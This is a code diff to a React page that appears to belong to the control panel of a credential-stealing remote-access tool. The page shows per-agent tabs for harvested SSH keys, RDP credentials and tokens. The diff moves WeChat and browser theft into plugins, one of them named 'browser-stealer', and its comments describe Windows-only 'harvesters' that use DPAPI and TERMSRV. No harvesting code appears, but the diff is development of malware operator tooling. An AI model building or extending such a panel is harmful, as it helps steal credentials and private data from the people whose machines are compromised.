@@ -3,8 +3,6 @@ import { useTranslation } from 'react-i18next';
 import { Tabs } from '@heroui/react';
 import { useAgent } from '../../contexts/AgentContext';
 import { useAgentPlatform } from '../../hooks/useAgentPlatform';
-import { WeChatTab } from './WeChatTab';
-import { BrowserTab } from './BrowserTab';
 import { SSHTab } from './SSHTab';
 import { RDPTab } from './RDPTab';
 import { TokenTab } from './TokenTab';
@@ -13,14 +11,12 @@ export default function SoftwareDataPage() {
   const { t } = useTranslation();
   const { agentId } = useAgent();
   const platform = useAgentPlatform();
-  const [tab, setTab] = useState<string>('wechat');
+  const [tab, setTab] = useState<string>('ssh');
 
-  // WeChat/browser/RDP harvesters are Windows-only (DPAPI, NTQQ, TERMSRV);
-  // SSH keys are cross-platform. QQ functionality lives in the qqkey plugin.
+  // RDP harvesters are Windows-only (DPAPI, TERMSRV); SSH keys are cross-platform.
+  // WeChat/browser live in plugins (com.libra.wechat-file / com.libra.browser-stealer).
   const isWindows = platform === 'windows';
   const tabs = [
-    { id: 'wechat', label: t('othersoft.wechat'), render: <WeChatTab agentId={agentId} />, windowsOnly: true },
-    { id: 'browser', label: t('othersoft.browser.title'), render: <BrowserTab agentId={agentId} />, windowsOnly: true },
     { id: 'ssh', label: t('othersoft.ssh.title'), render: <SSHTab agentId={agentId} /> },
     { id: 'rdp', label: t('othersoft.rdp.title'), render: <RDPTab agentId={agentId} />, windowsOnly: true },
     { id: 'token', label: 'Token', render: <TokenTab agentId={agentId} />, windowsOnly: true },
